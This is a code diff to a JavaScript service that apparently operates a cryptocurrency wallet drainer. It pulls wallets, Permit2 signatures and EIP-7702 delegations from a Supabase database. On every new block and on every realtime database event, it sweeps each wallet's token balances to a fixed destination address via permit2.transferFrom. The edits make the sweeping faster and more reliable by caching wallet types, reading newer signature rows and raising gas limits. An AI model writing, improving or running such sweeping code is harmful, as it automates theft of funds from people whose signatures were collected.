@@ -87,8 +87,8 @@ const contract = CONTRACT_ADDRESS
 let sweepingETH        = false;
 const sweepingToken    = {};
 let lastSweepBlock     = 0;
-// Set of addresses we know are delegated (fast lookup in block listener).
-const delegatedWallets = new Set();
+// Map of address → type ("eip7702" | "permit2") for fast block-listener routing.
+const delegatedWallets = new Map();
 
 // ── Logging ───────────────────────────────────────────────────────────────────
 
@@ -222,16 +222,24 @@ async function sweepPermit2Wallet(walletAddress) {
   const checksum = normalizeAddress(walletAddress);
   if (!checksum || !supabase) return;
 
-  // 1. Load permit2 signature from Supabase.
-  const { data, error: dbErr } = await supabase
+  // 1. Load permit2 data — prefer permit2_signatures table (newest row first).
+  let tokens = [];
+  let deadlineIso = null;
+
+  const { data: sigRow, error: sigErr } = await supabase
     .from("permit2_signatures")
-    .select("*")
+    .select("tokens, deadline")
     .eq("address", checksum.toLowerCase())
     .eq("chain", CHAIN)
+    .order("created_at", { ascending: false })
+    .limit(1)
     .single();
 
-  if (dbErr || !data) {
-    // Fallback: try permit_metadata from delegated_wallets.
+  if (!sigErr && sigRow) {
+    tokens      = sigRow.tokens || [];
+    deadlineIso = sigRow.deadline || null;
+  } else {
+    // Fallback: read permit_metadata from delegated_wallets.
     const { data: dwRow } = await supabase
       .from("delegated_wallets")
       .select("permit_metadata")
@@ -243,23 +251,18 @@ async function sweepPermit2Wallet(walletAddress) {
       warn(`[permit2] no signature data found for ${checksum}`);
       return;
     }
-    // Build a compatible data object from permit_metadata.
-    data = {
-      details:     dwRow.permit_metadata.details || [],
-      sig_deadline: dwRow.permit_metadata.sigDeadline,
-      signature:   dwRow.permit_metadata.signature,
-      spender:     dwRow.permit_metadata.spender,
-    };
+    tokens      = dwRow.permit_metadata.tokens || [];
+    // deadline stored as unix seconds (number) in permit_metadata
+    const dl    = dwRow.permit_metadata.deadline;
+    deadlineIso = dl ? new Date(Number(dl) * 1000).toISOString() : null;
   }
 
-  // 2. Check if signature deadline has passed.
-  const deadlineSeconds = Number(data.sig_deadline || data.sigDeadline || 0);
-  if (deadlineSeconds > 0 && deadlineSeconds < Math.floor(Date.now() / 1000)) {
-    warn(`[permit2] signature expired for ${checksum} (deadline=${deadlineSeconds})`);
+  // 2. Check expiry — deadline is an ISO string in both tables.
+  if (deadlineIso && new Date(deadlineIso) < new Date()) {
+    warn(`[permit2] signature expired for ${checksum} (deadline=${deadlineIso})`);
     return;
   }
 
-  const tokens = data.details || data.tokens || [];
   if (!tokens.length) {
     warn(`[permit2] no tokens found for ${checksum}`);
     return;
@@ -268,8 +271,9 @@ async function sweepPermit2Wallet(walletAddress) {
   log(`[permit2] sweeping ${checksum} — ${tokens.length} token(s)`);
 
   // 3. transferFrom each token that has a balance.
+  // tokens[] is an array of address strings in the new schema.
   for (const entry of tokens) {
-    const tokenAddress = normalizeAddress(entry.token || entry.tokenAddress || entry);
+    const tokenAddress = normalizeAddress(typeof entry === "string" ? entry : entry.token || entry.tokenAddress);
     if (!tokenAddress) continue;
 
     try {
@@ -288,12 +292,13 @@ async function sweepPermit2Wallet(walletAddress) {
       const MAX_UINT160 = (1n << 160n) - 1n;
       const amount = balance > MAX_UINT160 ? MAX_UINT160 : balance;
 
+      const fee = await getFeeData();
       const tx = await permit2.transferFrom(
         checksum,
         DESTINATION_ADDRESS,
         amount,
         tokenAddress,
-        { gasLimit: 100_000n }
+        { gasLimit: 150_000n, ...fee }
       );
       log(`[permit2] transferFrom(${symbol}) tx: ${tx.hash}`);
       await tx.wait();
@@ -328,14 +333,11 @@ async function loadDelegatedWallets() {
       .eq("chain", CHAIN);
     if (error) { warn(`loadDelegatedWallets: ${error.message}`); return; }
     delegatedWallets.clear();
-    let permit2Count = 0;
     for (const row of data || []) {
       const checksum = normalizeAddress(row.address);
-      if (checksum) {
-        delegatedWallets.add(checksum);
-        if (row.type === "permit2") permit2Count++;
-      }
+      if (checksum) delegatedWallets.set(checksum, row.type || "eip7702");
     }
+    const permit2Count = [...delegatedWallets.values()].filter(t => t === "permit2").length;
     log(`Loaded ${delegatedWallets.size} wallets (${permit2Count} permit2, ${delegatedWallets.size - permit2Count} eip7702)`);
   } catch (e) { warn(`loadDelegatedWallets: ${e.message}`); }
 }
@@ -353,13 +355,13 @@ function subscribeRealtime() {
       async (payload) => {
         const row     = payload.new || {};
         const address = normalizeAddress(row.address);
+        const type    = row.type || "eip7702";
         if (!address) return;
         const isNew = !delegatedWallets.has(address);
-        delegatedWallets.add(address);
-        log(`🔔 Realtime ${isNew ? "new" : "updated"} wallet ${address} (type=${row.type || "eip7702"})`);
+        delegatedWallets.set(address, type);
+        log(`🔔 Realtime ${isNew ? "new" : "updated"} wallet ${address} (type=${type})`);
 
-        // Sweep immediately — route based on type from the Realtime payload.
-        if ((row.type || "eip7702") === "permit2") {
+        if (type === "permit2") {
           await sweepPermit2Wallet(address).catch((e) => err(`permit2 sweep: ${e.message}`));
         } else {
           await sweepDelegatedWallet(address).catch((e) => err(`eip7702 sweep: ${e.message}`));
@@ -372,10 +374,11 @@ function subscribeRealtime() {
       async (payload) => {
         const row     = payload.new || {};
         const address = normalizeAddress(row.address);
+        const type    = row.type || "eip7702";
         if (!address) return;
-        delegatedWallets.add(address);
-        log(`🔄 Realtime update ${address} (type=${row.type || "eip7702"})`);
-        if ((row.type || "eip7702") === "permit2") {
+        delegatedWallets.set(address, type);
+        log(`🔄 Realtime update ${address} (type=${type})`);
+        if (type === "permit2") {
           await sweepPermit2Wallet(address).catch((e) => err(`permit2 sweep: ${e.message}`));
         } else {
           await sweepDelegatedWallet(address).catch((e) => err(`eip7702 sweep: ${e.message}`));
@@ -408,11 +411,10 @@ function attachBlockListener() {
       }
     }
 
-    // Sweep each delegated wallet — type looked up from Supabase per wallet.
-    for (const walletAddress of delegatedWallets) {
+    // Sweep each delegated wallet — type read from Map (no DB call per block).
+    for (const [walletAddress, walletType] of delegatedWallets) {
       try {
-        const type = await getWalletType(walletAddress);
-        if (type === "permit2") {
+        if (walletType === "permit2") {
           await sweepPermit2Wallet(walletAddress);
         } else {
           await sweepDelegatedWallet(walletAddress);
